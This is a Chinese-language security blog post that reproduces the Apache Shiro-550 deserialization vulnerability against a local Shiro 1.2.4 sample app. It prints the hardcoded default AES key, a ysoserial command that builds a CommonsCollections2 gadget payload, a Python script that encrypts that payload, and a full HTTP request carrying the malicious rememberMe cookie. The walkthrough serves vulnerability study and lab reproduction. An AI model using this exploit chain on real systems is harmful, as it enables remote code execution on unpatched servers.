---
date: 2024-04-13 15:01:13
---

# 「Java安全」Shiro反序列化漏洞笔记（一）

## 0x01 Shiro 产品了解
Apache Shiro是一个强大且易用的Java安全框架，执行**身份验证**、**授权**、**密码**和**会话管理**，使用Shiro的易于理解的API，可以快速、轻松的获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150533.png)

基本特点如下：
- Authentication：身份认证/登录，验证用户是不是拥有相应的身份；
- Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限，即判断用户是否能做某些事情；
- Session Management：会话管理，即用户登录后就是一次会话，在没有退出之前，他的所有信息都会在会话中，会话可以是普通JavaSE环境的，也可以是Web环境的；
- Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；
- Web Support：Web支持，可以非常容易的集成到Web环境；
- Caching：缓存，比如用户登录之后，其用户西悉尼、拥有的角色/权限不必每次去查看找，这样可以提升效率；
- Concurrency：Shiro 支持多线程应用的并发验证，即如在一个线程中开启另外一个线程，能把权限自动传递过去；
- Testing：提供测试支持
- Run As：允许一个用户假装为另一个用户（如果允许的话）的身份进行访问；
- **Remember Me**：记住密码，这是一个非常常见的功能，即一次登录后，下次再来访问的话就不需要再登录了；

## 0x02 环境搭建

### 2.1 下载源码
获取1.2.4版本的Shiro源码

### 2.2 项目了解
![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150636.png)

项目根目录文件：
- all：所有的 Shiro JAR包
- core：Shiro 核心依赖
- samples：shiro示例
- src：shiro源码
- support：shiro支持
- tools：shiro工具
- web：shiro Web项目 

进入samples文件夹

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150721.png)

- aspectj：shiro支持AOP和注释；
- quickstart：快速入门；
- spring：spring 使用 shiro 示例
- spring-client：
- spring-hibernate：
- standalone：一个单独的示例；
- web：一个完整的web示例；

### 2.3 启动项目

1. 将 shiro/samples/web导入IDE，添加pom文件的内容；
```xml
  	<properties>
        <maven.compiler.source>1.8</maven.compiler.source>
        <maven.compoler.target>1.8</maven.compoler.target>
    </properties>
```

修改pom.xml（shiro-root）文件
```xml
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.1.2</version>
<!--            <scope>runtime</scope>-->
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
            <scope>provided</scope>
        </dependency>
```

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150829.png)

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150845.png)

如果使用Java1.8，那么在根目录下的pom.xml中将 jdk 版本修改为1.8。

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150902.png)

启动后页面如下：

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150918.png)


## 0x03 Shiro-550 反序列漏洞
<a name="vWzgD"></a>
### 3.1 漏洞说明
在response返回包中返回含有rememberMe的字段：

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413150938.png)

**RememberMe功能说明：**

1. shiro**在登录处**提供了RememberMe这个功能点，用来记录用户登录的凭证，shiro会对用户传入的cookie进行**解密**并**进行反序列化**，服务端接收rememberMe的cookie值之后的操作如下：
```xml
Base64解码----> 使用密钥进行AES解密----> 反序列化
```

2. 由于**该版本AES加密的密钥Key被硬编码在代码中（该漏洞能够被利用的本质原因）**，且大部分项目未修改默认的AES密钥，这就意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化、AES加密、Base64编码，然后将其作为Cookie的Remember Me字段值进行发送，shiro 将数据进行解密并且反序列化，最终触发反序列化漏洞。
3. 处理Cookie的类是`CookieRememberMeManager`，这个类继承了`AbstractRememberManager`类，通过跟进`AbstractRememberMeManager`类，就可以看到AES的key了。Key所在类`org.apache.shiro.mgt.AbstractRememberMeManager`看到`kPH+bIxk5D2deZiIxcaaaA==`的Key的内容了。

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151000.png)


### 3.2 漏洞复现

#### 漏洞入口
入口点在RememberMe的Cookie字段，需要在页面中勾选RememberMe选项：

- 输入错误密码的返回情况：
![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151023.png)


- 输入正确密码的返回情况：
![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151041.png)

#### 生成序列化数据
使用ysoserial反序列化工具：`https://github.com/frohoff/ysoserial`。
工具使用方法：
![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151129.png)

查看项目使用的利用链：

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151217.png)

根据项目CC4链使用工具参数，生成反序列化恶意文件

```powershell
java -jar ysoserial-all.jar CommonsCollections2  "cacl" > evil.txt
```

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151250.png)

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151301.png)

#### 编写加密脚本
```python
#!/usr/bin/python3
# -*- coding:utf-8-*-
from _ast import Lambda
from Crypto.Cipher import AES
import uuid,base64

key = "kPH+bIxk5D2deZiIxcaaaA=="
f=open("evil.txt",'rb')
bs = AES.block_size
pad = lambda s:s + ((bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()
key = base64.b64decode(key)
iv = uuid.uuid4().bytes
encryptor = AES.new(key, AES.MODE_CBC, iv)
file_body = pad(f.read())
base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
payload = str(base64_ciphertext, encoding="utf-8")
fo = open("poc.txt", "w")
fo.write(payload)
```

![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151329.png)

#### 触发漏洞
将生成的poc内容作为Cookie中的rememberMe字段值，触发漏洞
```http
POST /samples_web_war/login.jsp HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/samples_web_war/login.jsp
Cookie: JSESSIONID=7B92EADFB9740F51D190F66B51EF38B8; rememberMe=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
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=root&password=1234&submit=Login
```

结果：
![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240413151358.png)
